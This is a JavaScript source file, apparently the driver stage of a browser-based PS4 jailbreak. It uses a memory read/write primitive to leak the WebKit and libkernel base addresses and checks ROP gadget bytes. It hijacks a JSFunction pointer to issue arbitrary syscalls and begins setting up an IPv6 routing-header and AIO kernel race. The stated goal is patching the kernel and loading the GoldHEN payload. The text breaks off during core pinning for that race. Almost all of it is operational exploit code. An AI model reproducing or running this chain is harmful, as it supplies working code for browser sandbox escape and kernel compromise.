import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

function ensureHostConsole() {
  var out = document.getElementById("out");
  var st = document.getElementById("state");
  if (!out) {
    out = document.createElement("pre");
    out.id = "out";
    (document.body || document.documentElement).appendChild(out);
  }
  if (!st) {
    st = document.createElement("div");
    st.id = "state";
    (document.body || document.documentElement).appendChild(st);
  }
  return { outEl: out, stateEl: st };
}
var _hostCons = ensureHostConsole();
const outEl = _hostCons.outEl;
const stateEl = _hostCons.stateEl;
const lines = [];
let passCount = 0,
  failCount = 0;
let armedEver = false;
let alreadyLoaded = false;
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

function hostOk() {
  var m = document.getElementById("msgs");
  if (m) {
    m.innerHTML = "GoldHEN v2.4b18.12 Loaded ...";
  }
}

function hostFail() {
  var m = document.getElementById("msgs");
  if (m) {
    m.innerHTML = "Failed to Load! Restart Your Console ...";
    m.style.color = "yellow";
  }
}

function hostAlready() {
  var m = document.getElementById("msgs");
  if (m) {
    m.innerHTML = "GoldHEN is Already Loaded ...";
  }
}

function post(tag, detail) {
  try {
    const x = new XMLHttpRequest();
    x.open("POST", "/t", true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send(
      "PS4-JB&tag=" +
        encodeURIComponent(tag) +
        "&detail=" +
        encodeURIComponent(String(detail == null ? "" : detail)),
    );
  } catch (e) {}
}

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
  / -- /,
  /\.\s/,
  /;\s/,
  /,\s+(which|so|and that|because|since|as that)\s/,
  /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
  /\s+so\s+[a-z]/,
  /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
  if (VERBOSE || s == null) return s;
  s = String(s);
  for (const re of PROSE) {
    const m = re.exec(s);
    if (m && m.index > 0) s = s.slice(0, m.index);
  }
  s = s.replace(/\s+$/, "");
  if (s.length > 140) s = s.slice(0, 140) + "...";
  return s;
}

const SHOW_LOG = params.get("log") === "1";
if (SHOW_LOG && document.body) document.body.className = "log";
function finishUI(ok) {
  if (ok) hostOk();
  else hostFail();
  if (SHOW_LOG || !document.body) return;
  document.body.className = ok ? "done" : "fail";
}
function mark(tag, detail) {
  const raw = detail;
  detail = terse(detail);
  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
  if (SHOW_LOG && outEl) {
    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines
      .map(function (l) {
        l = esc(l);
        const c =
          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED|GIVEUP|NO-STORAGE|UNSEEN/i.test(
            l,
          )
            ? "bad"
            : /WARN|SKIP|REFUS|COMMITTED|DIRTY/i.test(l)
              ? "warn"
              : /\bOK\b|\bPASS\b|PASS=|ACHIEVED|RUNNING|ARMED/i.test(l)
                ? "ok"
                : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
      })
      .join("\n");
    outEl.scrollTop = outEl.scrollHeight;
  }
  post(tag, raw);
}

function trace(tag, detail) {
  if (VERBOSE) mark(tag, detail);
  else post(tag, detail);
}
function state(t, c) {
  if (!SHOW_LOG || !stateEl) return;
  stateEl.textContent = t;
  stateEl.className = c || "";
}
function check(name, ok, detail) {
  if (ok) {
    passCount++;
    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
  } else {
    failCount++;
    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
  }
  return ok;
}

const SYS = {
  getpid: 20,
  getuid: 0x18,
  close: 6,
  socket: 97,
  socketpair: 0x87,
  getsockopt: 118,
  setsockopt: 0x69,
  mmap: 477,
  munmap: 73,
  thr_self: 432,
  getgroups: 79,
  getgid: 47,
  cpuset_getaffinity: 487,
  cpuset_setaffinity: 488,
  aio_multi_poll: 664,
  aio_multi_delete: 662,
  getegid: 43,
  aio_multi_wait: 663,
  aio_multi_cancel: 666,
  aio_submit_cmd: 669,
  write: 4,
  sysctl: 202,
  kill: 37,
  getppid: 39,
};
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];
let mainMf = null,
  mainOrig = null,
  mainArmed = false;
let pinRestore = null;

let jbRestoreHook = null;
let allDone = false,
  jailbroken = false,
  kpatched = false,
  payloadRunning = false;

(async function () {
  let p = null;

  const opened = [];
  let closeFd = null;
  try {
    await new Promise(function (r) {
      setTimeout(r, 100);
    });
	  
    const { key, off } = offsetsFor(navigator.userAgent);
    mark("BUILD", "jb=skipjb2 base=ef1670a");
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
      state("no offsets for this firmware", "bad");
      return;
    }
    const fwKey = key || "unknown";

    const DO_JB = params.get("jb") !== "0";
    const DO_PATCH = params.get("patch") !== "0";
    const DO_PAYLOAD = params.get("payload") !== "0";
    const SKIPJB = params.get("skipjb") !== "0";

    const KEEP_JB = params.get("keepjb") === "1";

    const NEED_K = [
      "k_idt_rsvd",
      "k_oid_kern_file",
      "k_oid_maxfilesperproc",
      "k_oid_maxprocperuid",
      "k_oid_maxfiles",
      "k_arg1_maxfilesperproc",
      "k_arg1_maxprocperuid",
      "k_arg1_maxfiles",
      "k_prison0",
      "k_rootvnode",
    ];
    const missing = NEED_K.filter((k) => off[k] === undefined);
    if (
      !check(
        "kernel-table-present",
        missing.length === 0,
        "fw=" +
          fwKey +
          " missing=[" +
          missing.join(",") +
          "]" +
          " -- dump this firmware with kdump5.html and derive its table" +
          " with tools/kderive.py; stage=pre_primitive",
      )
    )
      return;

    const KPATCH_FILE =
      "slopkit/patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
    const PAYLOAD_FILE = "goldhen_2.4b18.12.bin";
    const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
      (k) => off[k] === undefined,
    );
    if (
      !check(
        "kpatch-table-present",
        !DO_PATCH || needPatch.length === 0,
        "missing=[" +
          needPatch.join(",") +
          "] blob=" +
          KPATCH_FILE +
          " -- build it from patches/<fw>.c, see patches/1300.c",
      )
    )
      return;
    const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter(
      (k) => off[k] === undefined,
    );
    if (
      !check(
        "payload-table-present",
        !DO_PAYLOAD || needPl.length === 0,
        "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
      )
    )
      return;
    mark("FW-STATUS", off.fw_status || "none");
    mark(
      "FW-KTABLE",
      "idt_rsvd=0x" +
        off.k_idt_rsvd.toString(16) +
        " prison0=0x" +
        off.k_prison0.toString(16) +
        " rootvnode=0x" +
        off.k_rootvnode.toString(16) +
        " kpatch=" +
        KPATCH_FILE +
        " payload=" +
        PAYLOAD_FILE +
        " src=ps4_offsets.js",
    );

    // ---- benign-miss auto-retry (reads only, before any kernel write) ----
    // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
    // phase -- no kernel .data/.text has been touched yet, so reloading and
    // retrying is safe. The counter lives in sessionStorage so it survives
    // the reload and is cleared the moment the read phase succeeds, so a
    // later manual run always starts fresh. NEVER call retryBenign() after a
    // kernel write: a reload would re-enter with the kernel already modified.
    // A hard KP (a total reclaim miss that faults inside the cancel walk)
    // cannot be caught here and still needs a reboot -- this only recovers
    // the benign, detectable misses.
    const retryArg = parseInt(params.get("retry") || "", 10);
    const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
    const RETRY_KEY = "jb1352-read-retry";
    const retryCount = () => {
      try {
        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
        return Number.isFinite(v) && v > 0 ? v : 0;
      } catch (e) {
        return 0;
      }
    };
    const clearRetry = () => {
      try {
        sessionStorage.removeItem(RETRY_KEY);
      } catch (e) {}
    };
    const retryBenign = (why) => {
      const n = retryCount();
      if (n >= RETRY_MAX) {
        mark(
          "AUTO-RELOAD-GIVEUP",
          "why=" + why + " reloads=" + n + " -- reboot and try again",
        );
        return false;
      }
      let stored = -1;
      try {
        sessionStorage.setItem(RETRY_KEY, String(n + 1));
        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
      } catch (e) {
        stored = -1;
      }
      if (stored !== n + 1) {
        mark(
          "AUTO-RELOAD-NO-STORAGE",
          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
        );
        return false;
      }
      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
      setTimeout(() => {
        try {
          location.reload();
        } catch (e) {}
      }, 400);
      return true;
    };
    if (retryCount() > 0)
      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);

    state("running the primitive...", "warn");
    await new Promise((r) => setTimeout(r, 0));

    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
    const carrier = await establishPrimitive({
      maxAttempts: 6,
      onEvent: (t, d, a) =>
        (PRIMITIVE_LOUD.test(t) ? mark : trace)(
          t,
          (a != null ? "[" + a + "] " : "") + (d || ""),
        ),
    });
    installWindowP(carrier, { promote: false });
    if (!window.p) throw new Error("window.p was not installed");
    p = window.p;
    mark(
      "PAIR-STATUS",
      "state=" +
        pairStatus.state +
        " promoted=" +
        pairStatus.promoted +
        "   (promotion off: the 137 MB stays pinned)",
    );
    mark("PRIMITIVE-OK", "");

    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(
      p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function),
    );
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    const libkernelBase = errorFn.sub32(off.k__error);
    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
    const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
    if (
      !check(
        "module-bases-0x4000-aligned",
        aligned(webkitBase) && aligned(libkernelBase),
        "",
      )
    )
      return;

    const G = {};
    const GAD = [
      ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
      ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
      ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
      ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
      ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
      ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
      ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
      ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
      [
        "MOV_RDI_RAX_RET",
        off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
        [0x48, 0x89, 0x07, 0xc3],
      ],
      ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
      ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
      ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
      ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
      [
        "G4",
        off.wk_MOV_RDX_RAX_18_CALL_10,
        [0x48, 0x8b, 0x50, off.pivot_view_sp],
      ],
      ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
      const a = webkitBase.add32(rva);
      let good = true;
      for (let i = 0; i < pat.length; ++i) {
        if (pat[i] === null) continue;
        if (p.read1(a.add32(i)) !== pat[i]) {
          good = false;
          break;
        }
      }
      if (good) {
        G[nm] = a;
        gated++;
      } else mark("GADGET-BAD", nm);
    }
    if (
      !check(
        "gadget-table-fits-module",
        gated === GAD.length,
        gated + "/" + GAD.length,
      )
    )
      return;
    const argGadget = [
      G.POP_RDI_RET,
      G.POP_RSI_RET,
      G.POP_RDX_RET,
      G.POP_RCX_RET,
      G.POP_R8_RET,
      G.POP_R9_RET,
    ];

    const stubAddr = new Map();
    let seeded = 0;
    if (off.k_stubs) {
      for (const numStr in off.k_stubs) {
        const num = +numStr,
          o = off.k_stubs[numStr];
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
        if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 !== num)
          continue;
        stubAddr.set(num, libkernelBase.add32(o));
        seeded++;
      }
    }
    const need = new Set(
      Object.keys(SYS)
        .map((k) => SYS[k])
        .filter((n) => !stubAddr.has(n)),
    );
    let scanned = 0;
    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
      const v = p.read8(libkernelBase.add32(o));
      if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
      const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
      if (!need.has(num)) continue;
      stubAddr.set(num, libkernelBase.add32(o));
      need.delete(num);
      scanned++;
    }
    mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
    const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
      return;

    function bufAddr(ab) {
      const c = p.leakval(ab);
      return p.read8(
        p
          .read8(c.add32(off.wk_ArrayBuffer_m_impl))
          .add32(off.wk_ArrayBuffer_m_contents_m_data),
      );
    }
    function put(dv, at, v) {
      if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
      } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
      }
    }
    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
    function makeCtx() {
      const sb = new ArrayBuffer(0x20),
        pb = new ArrayBuffer(PB_SIZE);
      const kb = new ArrayBuffer(0x2000),
        fb = new ArrayBuffer(0x40);
      keepAlive.push(sb, pb, kb, fb);
      const c = {
        storeDv: new DataView(sb),
        pivotDv: new DataView(pb),
        stackDv: new DataView(kb),
        frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb),
        frameU8: new Uint8Array(fb),
      };
      keepAlive.push(
        c.storeDv,
        c.pivotDv,
        c.stackDv,
        c.frameDv,
        c.stackU8,
        c.frameU8,
      );
      c.S = bufAddr(sb);
      c.P = bufAddr(pb);
      c.K = bufAddr(kb);
      c.F = bufAddr(fb);
      put(c.storeDv, 0x00, G.G1);
      put(c.storeDv, 0x08, c.P);
      put(c.storeDv, 0x10, G.G3);
      put(c.storeDv, 0x18, G.G2);
      put(c.pivotDv, 0x00, c.P);
      put(c.pivotDv, 0x10, G.G5);
      put(c.pivotDv, 0x20, G.G4);
      return c;
    }
    function layout(c, target, args) {
      c.stackU8.fill(0);
      c.frameU8.fill(0);
      const insts = [];
      for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]);
        insts.push(args[i]);
      }
      const targetIdx = insts.length;
      insts.push(target);
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = 0x2000 - 8 * insts.length;
      if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
      for (let i = 0; i < insts.length; ++i)
        put(c.stackDv, at + 8 * i, insts[i]);
      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    const M = makeCtx();
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);
    const pivotObj = {};
    keepAlive.push(pivotObj);
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;
    function callAddr(target, args) {
      layout(M, target, args);
      const saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      Math.expm1(pivotObj);
      p.write8(pivotCell, saved);
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }
    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
    closeFd = (fd) => sc(SYS.close, fd).i32;
    function errno() {
      const r = callAddr(errorFn, []);
      const a = new int64(r.lo, r.hi);
      return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
    }

    const pid = sc(SYS.getpid).i32;
    check(
      "chain-reaches-kernel",
      pid > 0,
      "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
    );

    if (SKIPJB) {
      const SETUID = 23;
      if (!stubAddr.has(SETUID))
        for (let o = 0; o < off.k_scan_stage1; o += 16) {
          const v = p.read8(libkernelBase.add32(o));
          if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49)
            continue;
          if (
            ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 ===
            SETUID
          ) {
            stubAddr.set(SETUID, libkernelBase.add32(o));
            break;
          }
        }
      if (!stubAddr.has(SETUID)) {
        mark("JB-PROBE", "stub=absent skip=impossible");
      } else {
        const suRv = sc(SETUID, 0).i32;
        const uidNow = sc(SYS.getuid).i32;
        mark("JB-PROBE", "setuid=" + suRv + " uid=" + uidNow);
        if (suRv === 0 && uidNow === 0) {
          alreadyLoaded = true;
          jailbroken = true;
          payloadRunning = true;
          allDone = true;
          mark(
            "JB-ALREADY",
            "kernel already patched -- 663 race skipped, pid=" + pid,
          );
          mark(
            "EG-VERDICT",
            "fw=" +
              fwKey +
              " jailbroken=1 kpatched=already payload_running=0" +
              " armings=0 reused=1 already=1",
          );
          hostAlready();
          return;
        }
      }
    }

    const scratchAb = new ArrayBuffer(0x1000);
    keepAlive.push(scratchAb);
    const scratch = bufAddr(scratchAb);
    const argAb = new ArrayBuffer(8);
    keepAlive.push(argAb);
    const argAddr = bufAddr(argAb),
      argDv = new DataView(argAb);
    const lenAb = new ArrayBuffer(8);
    keepAlive.push(lenAb);
    const lenAddr = bufAddr(lenAb),
      lenDv = new DataView(lenAb);

    function makeRpc(wk, name) {
      let seq = 0;
      const pending = new Map();
      wk.onmessage = function (e) {
        const d = e.data || {};
        const slot = pending.get(d.id);
        if (!slot) return;
        pending.delete(d.id);
        if (slot.timer) clearTimeout(slot.timer);
        if (d.type === "err") slot.reject(new Error(String(d.value)));
        else slot.resolve(d.value);
      };
      wk.onerror = (e) =>
        mark(
          "WORKER-ONERROR",
          name + " " + (e && e.message ? e.message : String(e)),
        );
      return function call(fname, timeoutMs, ...args) {
        return new Promise(function (resolve, reject) {
          const id = seq++;
          const timer =
            timeoutMs > 0
              ? setTimeout(function () {
                  pending.delete(id);
                  reject(new Error(name + ": timeout waiting for " + fname));
                }, timeoutMs)
              : null;
          pending.set(id, { resolve, reject, timer });
          wk.postMessage({ id: id, name: fname, args: args });
        });
      };
    }
    function ptrish(v) {
      return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0;
    }

    const IPPROTO_IPV6 = 41,
      IPV6_RTHDR = 51;
    const AF_INET6 = 28,
      SOCK_DGRAM = 2,
      AF_UNIX = 1,
      SOCK_STREAM = 1;
    const numArg = parseInt(params.get("num") || "", 10);
    const NUM = Number.isFinite(numArg) && numArg >= 2 && numArg <= 128 ? numArg : 9;
    const RTH_N = NUM > 2 ? 16 : 4;
    const RTH_SIZE = 16 * RTH_N + 8,
      RTH_LEN = 2 * RTH_N,
      RTH_SEGLEFT = RTH_N;
    const SCRATCH_PAGE = (RTH_N << 24) >>> 0,
      NODE0_DEC = ((RTH_N << 24) | (RTH_LEN << 8)) >>> 0;
    const SYS_MMAP = 477;
    const PROT_RW = 3,
      MAP_PRIVATE = 2,
      MAP_FIXED = 0x10,
      MAP_ANON = 0x1000;
    const NODE_SZ = 0x38;
    const N_LEAK = params.get("n") ? parseInt(params.get("n"), 10) : 262144;
    const SPRAY = params.get("spray") ? parseInt(params.get("spray"), 10) : 512;
    const SPIN = params.get("spin")
      ? parseInt(params.get("spin"), 10)
      : 40000000;
    const CUT = params.get("cut") !== "0";
    const CUT_MARGIN = params.get("cutmargin")
      ? parseInt(params.get("cutmargin"), 10)
      : 8192;
    mark(
      "PR-CFG",
      "nleak=" +
        N_LEAK +
        " spray=" +
        SPRAY +
        " spin=" +
        SPIN +
        " cut=" +
        (CUT ? CUT_MARGIN : 0),
    );

    async function bringWorker(name) {
      const w = { name: name, armed: false, wired: false };
      w.worker = new Worker("slopkit/rpc_worker.js");
      w.rpc = makeRpc(w.worker, name);
      if ((await w.rpc("ping", 15000)) !== "pong")
        throw new Error(name + " ping");
      const sLo = 0x10100000,
        sHi = 0xc0de0000;
      const arr = await w.rpc("init", 15000, sLo, sHi);
      keepAlive.push(arr);
      const D = bufAddr(arr.buffer);
      if (p.read4(D) >>> 0 !== sLo) throw new Error(name + " transfer");
      const storage = p.read8(D.add32(0x10));
      const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
      if (!mc || !ptrish(mc)) throw new Error(name + " walk");
      const bf = p.read8(mc.add32(8));
      let wm = null,
        wv = null,
        wl = null;
      for (let k = 1; k <= 8; ++k) {
        const val = p.read8(bf.sub32(8 * k));
        if (!ptrish(val)) continue;
        const inl = p.read8(val.add32(0x10));
        const len = p.read4(val.add32(0x18)) >>> 0;
        if (inl.hi === 0 && inl.low === 2) {
          if (!wl) wl = val;
        } else if (inl.hi > 0 && len === 6) {
          if (!wm) wm = val;
        } else if (inl.hi > 0 && len === 0x30) {
          if (!wv) wv = val;
        }
      }
      if (!(wm && wv && wl)) throw new Error(name + " shapes");
      w.master = wm;
      w.origVector = p.read8(wm.add32(0x10));
      p.write8(wm.add32(0x10), wv);
      w.wired = true;
      await w.rpc("setup", 15000, wl.low, wl.hi);
      await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
      w.armed = true;
      w.ctx = makeCtx();
      w.fire = function (num, args, ms) {
        layout(w.ctx, stubAddr.get(num), args);
        return w.rpc(
          "fire",
          ms === undefined ? 20000 : ms,
          w.ctx.S.low,
          w.ctx.S.hi,
        );
      };
      return w;
    }
    const w1 = await bringWorker("w1");
    const w2 = await bringWorker("w2");
    await w1.fire(SYS.getpid, []);
    const w1pid = w1.ctx.frameDv.getUint32(0, true) | 0;
    await w2.fire(SYS.getpid, []);
    const w2pid = w2.ctx.frameDv.getUint32(0, true) | 0;
    check(
      "pr-two-workers-reach-kernel",
      w1pid > 0 && w2pid > 0,
      "w1 getpid=" +
        w1pid +
        " w2 getpid=" +
        w2pid +
        " main=" +
        sc(SYS.getpid).i32,
    );

    const zoneOf = (s) => {
      const r = s & 15 ? (s + 16) & ~15 : s;
      let z = 16;
      while (z < r) z <<= 1;
      return z;
    };
    const geomOk =
      RTH_SIZE === 8 * (RTH_LEN + 1) &&
      (RTH_LEN & 1) === 0 &&
      RTH_LEN !== 0 &&
      RTH_SEGLEFT === RTH_LEN / 2 &&
      NODE0_DEC === (((RTH_SEGLEFT << 24) | (RTH_LEN << 8)) >>> 0) &&
      NODE0_DEC >= SCRATCH_PAGE &&
      NODE0_DEC < SCRATCH_PAGE + 0x10000 - 4 &&
      !(NODE0_DEC >= SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000) &&
        NODE0_DEC < SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000) + RTH_SIZE) &&
      zoneOf(NUM * 0x38) === zoneOf(RTH_SIZE);
    if (
      !check(
        "pr-geometry-consistent",
        geomOk,
        "num=" +
          NUM +
          " victim=0x" +
          (NUM * 0x38).toString(16) +
          " rth=0x" +
          RTH_SIZE.toString(16) +
          " len=" +
          RTH_LEN +
          " segleft=" +
          RTH_SEGLEFT +
          " zone=" +
          zoneOf(NUM * 0x38) +
          "/" +
          zoneOf(RTH_SIZE) +
          " scratch=0x" +
          SCRATCH_PAGE.toString(16) +
          " node0_dec=0x" +
          NODE0_DEC.toString(16),
      )
    )
      return;

    const mr = sc(
      SYS_MMAP,
      SCRATCH_PAGE,
      0x10000,
      PROT_RW,
      MAP_FIXED | MAP_ANON | MAP_PRIVATE,
      -1,
      0,
    );
    const mgot = new int64(mr.lo, mr.hi);
    if (
      !check(
        "pr-scratch-page-mapped",
        mgot.hi >>> 0 === 0 && mgot.low >>> 0 === SCRATCH_PAGE,
        "got=0x" + (mgot.low >>> 0).toString(16),
      )
    )
      return;
    const vs = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
    if (vs < 0) {
      mark("PR-ABORT", "verify socket");
      return;
    }
    opened.push(vs);
    {
      const tAb = new ArrayBuffer(RTH_SIZE);
      keepAlive.push(tAb);
      const tDv = new DataView(tAb);
      tDv.setUint8(1, RTH_LEN);
      tDv.setUint8(3, RTH_SEGLEFT);
      sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb), RTH_SIZE);
      const RT = SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000);
      lenDv.setUint32(0, RTH_SIZE, true);
      lenDv.setUint32(4, 0, true);
      const g1 = sc(
        SYS.getsockopt,
        vs,
        IPPROTO_IPV6,
        IPV6_RTHDR,
        RT,
        lenAddr,
      ).i32;
      const s2 = sc(
        SYS.setsockopt,
        vs,
        IPPROTO_IPV6,
        IPV6_RTHDR,
        RT,
        lenDv.getUint32(0, true),
      ).i32;
      if (
        !check(
          "pr-scratch-page-kernel-rw",
          g1 === 0 && s2 === 0,
          "copyout=" + g1 + " copyin=" + s2,
        )
      )
        return;
    }

    const mAb = new ArrayBuffer(0xc0);
    keepAlive.push(mAb);
    const mU32 = new Uint32Array(mAb);
    keepAlive.push(mU32);
    const mU8 = new Uint8Array(mAb);
    keepAlive.push(mU8);
    const M_AD = bufAddr(mAb);
    mU32.fill(0);
    mU32[6] = 4;
    const OWNER_LO = 6,
      OWNER_HI = 7;
    const lkAb = new ArrayBuffer(0x40);
    keepAlive.push(lkAb);
    const lkDv = new DataView(lkAb),
      lkAd = bufAddr(lkAb);
    const LX = lkAd.add32(0x00),
      LC = lkAd.add32(0x10);

    const NBLOCK = 8;
    const bspAb = new ArrayBuffer(8);
    keepAlive.push(bspAb);
    const bspDv = new DataView(bspAb);
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(bspAb)).i32 !== 0) {
      mark("PR-ABORT", "block socketpair");
      return;
    }
    const bsp0 = bspDv.getInt32(0, true),
      bsp1 = bspDv.getInt32(4, true);
    opened.push(bsp0, bsp1);
    const brbAb = new ArrayBuffer(0x40);
    keepAlive.push(brbAb);
    const brqAb = new ArrayBuffer(NBLOCK * 0x28);
    keepAlive.push(brqAb);
    const brqDv = new DataView(brqAb);
    for (let k = 0; k < NBLOCK; k++) {
      const b = k * 0x28;
      put(brqDv, b + 0x08, 0x40);
      put(brqDv, b + 0x10, bufAddr(brbAb));
      brqDv.setInt32(b + 0x20, bsp0, true);
    }
    const bidAb = new ArrayBuffer(NBLOCK * 4);
    keepAlive.push(bidAb);

    const CPU_LEVEL_WHICH = 3,
      CPU_WHICH_TID = 1,
      CPUSET_SZ = 0x10;
    const ID64 = new int64(0xffffffff, 0xffffffff);
    const mskAb = new ArrayBuffer(CPUSET_SZ);
    keepAlive.push(mskAb);
    const mskDv = new DataView(mskAb),
      mskAd = bufAddr(mskAb);
    new Uint8Array(mskAb).fill(0);
    const affGot = sc(
      SYS.cpuset_getaffinity,
      CPU_LEVEL_WHICH,
      CPU_WHICH_TID,
      ID64,
      CPUSET_SZ,
      mskAd,
    ).i32;
    const savedMask = mskDv.getUint32(0, true) >>> 0;
    const cores = [];
    for (let i = 0; i < 32; i++) if (savedMask & (1 << i)) cores.push(i);
    mark(
      "PIN-AVAIL",
      "rv=" +
        affGot +
        " mask=0x" +
        savedMask.toString(16) +
        " cores=" +
        cores.join(","),
    );
    if (
      !check(
        "pin-read-mask",
        affGot === 0 && cores.length > 0,
        "rv=" + affGot + " cores=" + cores.length,
      )
    )
      return;
    const coreArg = params.get("core")
      ? parseInt(params.get("core"), 10)
      : -1;
    const candidates = coreArg >= 0 ? [coreArg] : cores.slice();
    let PINCORE = -1,
      affSet = -1,
      backMask = 0;
    for (const c of candidates) {
      new Uint8Array(mskAb).fill(0);
      mskDv.setUint32(0, (1 << c) >>> 0, true);
      affSet = sc(
        SYS.cpuset_setaffinity,
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        ID64,
        CPUSET_SZ,
        mskAd,
      ).i32;
      new Uint8Array(mskAb).fill(0);
      sc(
        SYS.cpuset_getaffinity,
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        ID64,
        CPUSET_SZ,
        mskAd,
      );
      backMask = mskDv.getUint32(0, true) >>> 0;
      if (affSet === 0 && backMask === (1 << c) >>> 0) {
        PINCORE = c;
        break;
      }
      mark(
        "PIN-REJECT",
        "core=" + c + " rv=" + affSet + " back=0x" + backMask.toString(16),
      );
    }
    mark(
      "PIN-SET",
      "core=" +
        PINCORE +
        " rv=" +
        affSet +
        " reads back 0x" +
        backMask.toString(16) +
        " tried=" +
        candidates.join(","),
    );
    if (PINCORE < 0 && retryBenign("pin-failed")) return;
    if (
      !check(
        "MAIN-PINNED",
        PINCORE >= 0,
        "core=" +
          PINCORE +
          " mask=0x" +
          backMask.toString(16) +
          " (free and malloc in armOnce now share one UMA per-cpu bucket)",
      )
    )
      return;

    const otherCores = cores.filter((c) => c !== PINCORE);
